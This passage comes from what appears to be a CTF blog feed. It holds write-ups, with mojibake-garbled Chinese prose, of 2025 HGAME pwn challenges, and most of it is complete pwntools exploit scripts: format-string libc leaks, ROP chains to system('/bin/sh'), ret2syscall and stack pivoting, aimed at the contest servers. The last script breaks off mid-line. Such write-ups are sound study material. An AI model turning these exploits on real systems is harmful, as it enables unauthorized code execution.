class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">é­”æ³•çš„gadgetğŸª„</summary>
    
    
    
    <category term="magic" scheme="https://www.thir0th.xyz/categories/magic/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025HGAME</title>
    <link href="https://www.thir0th.xyz/posts/54319d4e.html"/>
    <id>https://www.thir0th.xyz/posts/54319d4e.html</id>
    <published>2025-04-19T16:12:35.000Z</published>
    <updated>2025-04-19T16:35:48.873Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2025hgame"><a href="#2025hgame" class="headerlink" title="2025hgame"></a>2025hgame</h2><p>å»å¹´çš„å”¯å”¯è¯ºè¯ºï¼Œä»Šå¹´çš„é‡æ‹³å‡ºå‡»ğŸ˜</p><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>æ— æ•°æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ä¸€æ¬¡åªæœ‰ä¸‰ä¸ªå­—èŠ‚ï¼Œvulnå¯ä»¥ç›´æ¥ç”¨-1ç»•è¿‡ï¼Œå…³é”®æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºlibcåœ°å€</p><p>å¯ä»¥ç”¨%*d+%sæ¥æ³„éœ²libcåœ°å€ï¼Œåç»­ç›´æ¥æ‰“systemçš„ropé“¾å­</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888731147-3eab4294-7d2c-45a2-bdbc-4cabf401b143.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888590185-0e8c91bc-89e9-42f8-95d7-7460bff37e1c.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31079)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def cmd(a):</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(a)</span><br><span class="line"></span><br><span class="line">rl(&quot;you have n chance to getshell\n n = &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%*d&#x27;)</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%s&#x27;)</span><br><span class="line">libc_base=get_addr64()-2206368</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot; n = &quot;)</span><br><span class="line">#bug()</span><br><span class="line">s(str(-1))</span><br><span class="line">sleep(0.01)</span><br><span class="line">payload=b&#x27;a&#x27;*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ</p><p>å¯ä»¥ç›´æ¥ç”¨æ ˆæº¢å‡ºåšï¼Œè¿™é‡Œä¸»è¦åˆ©ç”¨printfçš„gadget</p><p>æˆ‘ä»¬éœ€è¦åšå‡ºåˆç†çš„æ ˆå¸ƒå±€</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739964871396-afce93c2-37bd-4e32-b4b0-77ff33b4f3bf.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739965269125-67373558-814e-4da6-a546-2d7e917e7e5e.png" alt=""></p><p>å¯ä»¥æ³„éœ²å‡ºlibcåœ°å€ï¼Œåç»­èµ°systemçš„ropé“¾ä¼šå¡æ ˆï¼Œéœ€è¦ç”¨ret2syscallæ‰“system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;) </span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)   </span><br><span class="line">def li(a):</span><br><span class="line">    print(hex(a))     </span><br><span class="line">def r():</span><br><span class="line">    p.recv()</span><br><span class="line">def pr():</span><br><span class="line">    print(p.recv())</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_32():</span><br><span class="line">    return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:])    </span><br><span class="line">def get_addr():</span><br><span class="line">    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))    </span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;you have n chance to getshell&#x27;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">sl(b&#x27;%p&#x27;)</span><br><span class="line">rl(b&#x27;you type: &#x27;)</span><br><span class="line">stack=int(p.recv(14),16)+8480+16+0x10-8</span><br><span class="line">li(stack)</span><br><span class="line">rl(b&#x27; n = &#x27;)</span><br><span class="line"></span><br><span class="line">sl(b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">libc_base=int(p.recv(14),16)-0x29e40</span><br><span class="line">li(libc_base)</span><br><span class="line"></span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x000000000011f2e7</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">system,bin=get_sb()</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0xc+p64(rdi)+p64(bin)+p64(rax)+p64(0x3b)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(syscall)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h4><p>æ•°ç»„è¶Šç•Œï¼Œv7æœ€åä¸€ä¸ªè¶Šç•Œåˆ°v8ï¼Œv9ï¼Œæˆ‘ä»¬å¯ä»¥ä»»æ„è¶Šç•Œå†™ï¼Œåè¾¹æ‰“å°ä¹Ÿä¼šå¤–å¸¦å‡ºlibcåœ°å€ï¼Œå¹¶ä¸”ä¸æ˜¯å¶æ•°æœ‰ä¸¤æ¬¡æœºä¼šï¼Œç¬¬ä¸€æ¬¡åˆ©ç”¨æ•°ç»„è¶Šç•Œæ³„éœ²libcåœ°å€ï¼Œç¬¬äºŒæ¬¡èµ°ropé“¾å­</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888949445-d5360704-206f-42d7-b996-ce627203bcce.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,30656)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000015))</span><br><span class="line">for i in range(5):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">for i in range(18):</span><br><span class="line">rl(&quot; + &quot;)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(15),10)-171408</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000016))</span><br><span class="line">for i in range(2):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line">def pay(a):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(a))</span><br><span class="line">pay(rdi)</span><br><span class="line">pay(bin_sh)</span><br><span class="line">pay(rdi+1)</span><br><span class="line">pay(system)</span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h4><p>webpwn</p><p>ä¸»ä½“å°±æ˜¯ä¸€ä¸ªæ ˆè¿ç§»ï¼Œæœ‰0x10å­—èŠ‚æº¢å‡ºï¼Œå¹¶ä¸”å¼€å¯æ²™ç›’</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889189440-8b981794-ea80-4176-a01d-dca3ff45e009.png" alt=""></p><p>è¿™é‡Œç»™å‡ºgiftï¼Œè·Ÿæ­£å¸¸ç›¸æ¯”çš„å°±æ˜¯fdä½æ˜¯4ï¼Œæœ€åorwçš„å‚æ•°åˆ†åˆ«æ˜¯0ï¼Œ5ï¼Œ4</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889244487-ae479c2e-1268-4f62-a019-6f16b041373e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31421)</span><br><span class="line">rdi=0x0000000000401713</span><br><span class="line">rsi_r15=0x0000000000401711</span><br><span class="line">bss=0x404154</span><br><span class="line">read=0x40140F</span><br><span class="line">leave_ret=0x401426</span><br><span class="line">rbp=0x000000000040135d</span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(bss)+p64(read)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">sleep(0.01)</span><br><span class="line">pay2 =(p64(rsi_r15)+p64(elf.got[&#x27;read&#x27;])*2+p64(elf.plt[&#x27;write&#x27;])+p64(0x4013D2)).ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">pay2+=p64(0x404104-8)+p64(leave_ret)  </span><br><span class="line">#bug()</span><br><span class="line">s(pay2)</span><br><span class="line"></span><br><span class="line">libc_base=get_addr64()-libc.sym[&#x27;read&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + 